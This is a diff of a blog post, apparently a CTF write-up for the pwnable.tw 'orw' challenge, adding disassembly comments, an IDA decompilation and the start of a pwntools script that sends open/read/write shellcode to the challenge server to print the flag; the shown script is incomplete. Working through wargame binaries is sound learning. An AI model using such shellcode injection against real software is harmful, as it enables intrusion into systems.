@@ -1,7 +1,7 @@
 ---
-name: Pwnable &#58; Orw
+name: Pwnable.tw Orw
 tools: [Pwnable, Wargame, Beginner-friendly]
-image: https://pwnable.tw/static/image/og_img.png
+image: https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/pwnable/pwnable.png
 description:  A 100-point challenge from pwnable
 ---
 
@@ -162,20 +162,8 @@ So it's a 32-bit Little-endian ELF. So pop the binary into your Linux machine to
 ```sh
 $ chmod +x ./orw
 ```
-Open the binary in pwndbg:
-```sh
-$ gdb -q ./orw
-pwndbg> checksec
- [*] '/home/dan09/CTF/Pwnable/orw'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found       
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-```
 
-So there is a canary. Stack canary is a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immediately.
+Disassemble it:
 ```sh
 pwndbg> disass
 Dump of assembler code for function main:
@@ -188,17 +176,17 @@ Dump of assembler code for function main:
    0x08048556 <+14>:    sub    esp,0x4
    0x08048559 <+17>:    call   0x80484cb <orw_seccomp>     // This makes the binary only accept open, read and write syscall
    0x0804855e <+22>:    sub    esp,0xc
-   0x08048561 <+25>:    push   0x80486a0                    // an array pointer containing  'Give my your shellcode:' string
+   0x08048561 <+25>:    push   0x80486a0                    // an array pointer pointing to  'Give my your shellcode:' string
    0x08048566 <+30>:    call   0x8048380 <printf@plt>       // int printf(const char *format, ...) takes argument format (a pointer)
-   0x0804856b <+35>:    add    esp,0x10
-   0x0804856e <+38>:    sub    esp,0x4
-   0x08048571 <+41>:    push   0xc8
-   0x08048576 <+46>:    push   0x804a060
-   0x0804857b <+51>:    push   0x0
+   0x0804856b <+35>:    add    esp,0x10                     // clean up stacks
+   0x0804856e <+38>:    sub    esp,0x4             
+   0x08048571 <+41>:    push   0xc8                         // number of lengths
+   0x08048576 <+46>:    push   0x804a060                    // shellcode buffer
+   0x0804857b <+51>:    push   0x0                          // fd
    0x0804857d <+53>:    call   0x8048370 <read@plt>
    0x08048582 <+58>:    add    esp,0x10
    0x08048585 <+61>:    mov    eax,0x804a060
-   0x0804858a <+66>:    call   eax
+   0x0804858a <+66>:    call   eax                          // execute shellcode
    0x0804858c <+68>:    mov    eax,0x0
    0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
    0x08048594 <+76>:    leave  
@@ -211,4 +199,31 @@ pwndbg> da 0x80486a0
 
 ```
 
+Or you can just go the easy way and decompile it in IDA:
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf("Give my your shellcode:");
+  read(0, &shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+```
+
 Understand the code and you can move on to the next step.
+
+
+## 3. <u id="exploitation">Exploitation</u>
+So we can only use read, write and open in our syscall. So our job is to craft an one-off shellcode to read and write the flag to stdout for this challenge.
+```python
+from pwn import *
+context(arch='i386', os = 'linux')
+p = remote('chall.pwnable.tw',10001)
+open = '''
+mov eax, 0x5;
+push 0x00006761
+push 0x6c662f
+'''
+```
